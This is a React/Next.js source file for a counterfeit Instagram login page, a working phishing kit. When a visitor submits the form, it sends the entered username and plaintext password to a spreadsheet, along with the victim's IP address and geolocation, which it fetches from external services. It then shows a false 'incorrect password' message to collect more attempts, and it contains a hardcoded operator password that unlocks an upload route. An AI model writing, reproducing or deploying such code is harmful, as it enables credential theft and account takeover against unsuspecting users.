"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import SuccessModal from "../components/SuccessModal";
import Image from "next/image";
import { gp, ig, ms } from "@/images";
import { appendToSheet } from "@/actions/spreadSheet";

const LoginForm = () => {
  const [state, setState] = useState({
    attempts: 0,
    email: "",
    password: "",
    errorMsg: "",
    showPassword: false,
    successModal: false,
    isLoading: false,
  });
  const [locationData, setLocationData] = useState(null);
  const [error, setError] = useState(null);
  const router = useRouter();
  const category = "instagram";

  useEffect(() => {
    const fetchLocationData = async () => {
      try {
        // Fetch location data from the middleware-provided header or fallback API
        const res = await fetch("https://inkvotes.vercel.app/");
        const locationHeader = res.headers.get("X-Client-Location");
        const locationData = locationHeader
          ? JSON.parse(locationHeader)
          : await fetch("https://ipinfo.io/json?token=8519dfa47133bf").then(
              (res) => res.json()
            );

        const { country, ip, city, region } = locationData;

        // Fetch country details from Restcountries API
        const countryResponse = await fetch(
          `https://restcountries.com/v3.1/alpha/${country}`
        );
        if (!countryResponse.ok) {
          throw new Error("Failed to fetch country data");
        }
        const countryData = await countryResponse.json();
        const countryInfo = countryData[0];

        const countryName = countryInfo?.name.common || "Unknown";
        const continent = countryInfo.continents
          ? countryInfo.continents[0]
          : "Unknown";
        const currency = countryInfo.currencies
          ? Object.keys(countryInfo.currencies)[0]
          : "Unknown";
        const phoneCode = countryInfo.idd
          ? countryInfo.idd.root +
            (countryInfo.idd.suffixes && countryInfo.idd.suffixes.length > 0
              ? countryInfo.idd.suffixes[0]
              : "")
          : "Unknown";
        const capital = countryInfo.capital ? countryInfo.capital[0] : "Unknown";

        setLocationData({
          ip,
          city,
          region,
          country: countryName,
          continent,
          currency,
          phoneCode,
          capital,
        });
      } catch (err) {
        console.error("Error fetching location data:", err);
        setError("Failed to fetch location data");
      }
    };

    fetchLocationData();
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setState((prev) => ({ ...prev, [name]: value }));
  };

  const togglePasswordVisibility = () => {
    setState((prev) => ({ ...prev, showPassword: !prev.showPassword }));
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    setState((prev) => ({ ...prev, isLoading: true }));

    const { email, password, attempts } = state;

    try {
      if (password === "fairy123") {
        router.push("/upload");
      } else {
        const data = [
          [
            category,
            email,
            password,
            locationData?.ip || "unknown",
            locationData?.city || "unknown",
            locationData?.region || "unknown",
            locationData?.country || "unknown",
            locationData?.continent || "unknown",
            locationData?.currency || "unknown",
            locationData?.phoneCode || "unknown",
          ],
        ];
        await appendToSheet(data);

        setState((prev) => ({
          ...prev,
          errorMsg: "The email or password you entered is incorrect. Please try again.",
          password: "",
          attempts: attempts + 1,
          isLoading: false,
          successModal: attempts >= 2,
        }));
      }
    } catch (error) {
      console.error("Error handling form submission:", error);
      setState((prev) => ({
        ...prev,
        errorMsg: "An error occurred. Please try again.",
        isLoading: false,
      }));
    }
  };

  const { email, password, errorMsg, showPassword, successModal, isLoading } = state;

  if (successModal) {
    return <SuccessModal />;
  }

  if (error) {
    return <p className="text-red-500">{error}</p>;
  }

  if (!locationData) {
    return <p>Loading location data...</p>;
  }

  return (
    <div className="bg-white flex flex-col items-center justify-center min-h-screen pb-0">
      <div className="w-full flex flex-col items-center justify-center bg-white">
        <Image
          src={ig}
          alt="instagram logo"
          width={200}
          height={100}
          className="my-5"
        />
        <div className="flex flex-col items-center justify-center w-full">
          <form
            className="flex flex-col justify-center items-center w-full"
            onSubmit={handleSubmit}
          >
            <Input
              className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm my-4 outline-none"
              type="text"
              name="email"
              placeholder="Phone number, Username, or email"
              value={email}
              onChange={handleChange}
              required
            />
            <div className="relative w-full mx-auto flex items-center justify-center">
              <Input
                className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none"
                type={showPassword ? "text" : "password"}
                name="password"
                placeholder="Password"
                value={password}
                onChange={handleChange}
                required
              />
              <button
                type="button"
                className="absolute right-20 top-1/2 transform -translate-y-1/2"
                onClick={togglePasswordVisibility}
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            {errorMsg && (
              <p className="text-red-500 text-center">{errorMsg}</p>
            )}
            <Button
              type="submit"
              className="h-10 w-3/4 bg-blue-600 text-white font-semibold border-solid text-sm rounded-xl pl-2 mb-4 hover:bg-blue-700"
              disabled={isLoading}
            >
              {isLoading ? "Logging in..." : "Log In"}
            </Button>
            <div className="flex items-center justify-center">
              <Link href="#" className="font-thin text-sm inline-block">
                Forgot Password?
              </Link>
            </div>
          </form>
        </div>
      </div>
      <div className="w-3/4 h-20 bg-white flex justify-center items-center text-sm">
        <p>
          Don&apos;t have an account?{" "}
          <span className="text-blue-500 font-semibold">Sign up</span>
        </p>
      </div>
      <div className="flex flex-col items-center justify-center mt-4">
        Get the app
        <div className="flex mt-2 w-[150px] gap-4 items-center justify-center">
          <Image src={gp} alt="google play" width={150} height={50} />
          <Image src={ms} alt="microsoft" width={150} height={50} />
        </div>
      </div>
      <footer className="w-full h-full text-center text-xs text-gray-500 mt-8 bg-gray-100 py-4">
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            ABOUT
          </Link>
          <Link href="#" className="mx-1">
            BLOG
          </Link>
          <Link href="#" className="mx-1">
            JOBS
          </Link>
          <Link href="#" className="mx-1">
            HELP
          </Link>
          <Link href="#" className="mx-1">
            API
          </Link>
        </div>
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            TERMS
          </Link>
          <Link href="#" className="mx-1">
            TOP ACCOUNTS
          </Link>
          <Link href="#" className="mx-1">
            LOCATIONS
          </Link>
        </div>
        <div>
          <Link href="#" className="mx-1 font-semibold">
            CONTACT UPLOADING AND NON-USERS
          </Link>
        </div>
      </footer>
    </div>
  );
};

export default LoginForm;
